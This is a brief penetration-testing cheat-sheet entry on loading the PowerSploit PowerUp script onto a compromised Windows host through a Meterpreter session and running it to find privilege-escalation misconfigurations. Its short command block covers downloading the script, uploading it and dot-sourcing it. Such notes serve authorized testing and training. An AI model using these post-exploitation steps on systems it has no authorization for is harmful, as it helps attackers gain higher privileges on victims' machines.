
## Command

```
#Get a Meterpreter Shell

#Download PowerUp
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

#Upload PowerUp on meterpreter (windows machine)
meterpreter > upload /FILE/PowerUp.ps1

#Run  the ps1 executable
. .\PowerUp.ps1
```


## What is PowerUp

PowerUp purpose is to evaluate a Windows machine and determine any abnormalities. It aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. (VIA METERPRETER)